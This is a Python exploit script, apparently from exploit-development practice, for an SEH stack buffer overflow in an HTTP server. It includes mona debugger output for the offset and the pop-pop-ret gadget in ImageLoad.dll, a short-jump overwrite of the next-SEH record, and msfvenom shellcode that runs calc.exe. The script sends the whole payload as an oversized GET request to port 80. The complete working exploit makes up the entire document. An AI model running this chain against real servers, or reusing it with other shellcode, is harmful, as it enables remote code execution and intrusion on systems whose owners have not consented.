#!/usr/bin/python3
from pwn import remote, p32, asm

"""
[+] Command used:
!py mona exchain
Nr of SEH records : 1
Start of chain (TEB FS:[0]) : 0x06cc6f94
Address     Next SEH    Handler
-------     --------    -------
0x06cc6f94  0x34664633  0x46356646  (record smashed at offset 4061)

[+] Command used:
!py mona seh -m imageload.dll
[+] Results :
0x100103fe |   0x100103fe : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (imageload.dll)
"""

offset = 4061
junk = b"A" * offset

nseh = asm("jmp $+8").ljust(4, b"A")
seh = p32(0x100103fe)

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x20\x25\x2b\x2f\x5c'
shellcode =  b""
shellcode += b"\xdb\xdf\xbb\x91\x9b\x40\xb5\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x31\x31\x5a\x18\x03\x5a\x18"
shellcode += b"\x83\xc2\x95\x79\xb5\x49\x7d\xff\x36\xb2\x7d"
shellcode += b"\x60\xbe\x57\x4c\xa0\xa4\x1c\xfe\x10\xae\x71"
shellcode += b"\xf2\xdb\xe2\x61\x81\xae\x2a\x85\x22\x04\x0d"
shellcode += b"\xa8\xb3\x35\x6d\xab\x37\x44\xa2\x0b\x06\x87"
shellcode += b"\xb7\x4a\x4f\xfa\x3a\x1e\x18\x70\xe8\x8f\x2d"
shellcode += b"\xcc\x31\x3b\x7d\xc0\x31\xd8\x35\xe3\x10\x4f"
shellcode += b"\x4e\xba\xb2\x71\x83\xb6\xfa\x69\xc0\xf3\xb5"
shellcode += b"\x02\x32\x8f\x47\xc3\x0b\x70\xeb\x2a\xa4\x83"
shellcode += b"\xf5\x6b\x02\x7c\x80\x85\x71\x01\x93\x51\x08"
shellcode += b"\xdd\x16\x42\xaa\x96\x81\xae\x4b\x7a\x57\x24"
shellcode += b"\x47\x37\x13\x62\x4b\xc6\xf0\x18\x77\x43\xf7"
shellcode += b"\xce\xfe\x17\xdc\xca\x5b\xc3\x7d\x4a\x01\xa2"
shellcode += b"\x82\x8c\xea\x1b\x27\xc6\x06\x4f\x5a\x85\x4c"
shellcode += b"\x8e\xe8\xb3\x22\x90\xf2\xbb\x12\xf9\xc3\x30"
shellcode += b"\xfd\x7e\xdc\x92\xba\x71\x96\xbf\xea\x19\x7f"
shellcode += b"\x2a\xaf\x47\x80\x80\xf3\x71\x03\x21\x8b\x85"
shellcode += b"\x1b\x40\x8e\xc2\x9b\xb8\xe2\x5b\x4e\xbf\x51"
shellcode += b"\x5b\x5b\xdc\x34\xcf\x07\x0d\xd3\x77\xad\x51"

payload = junk + nseh + seh + shellcode

content = b"GET /" + payload + b" HTTP/1.1\r\n"

shell = remote("Windows", 80)
shell.sendline(content)
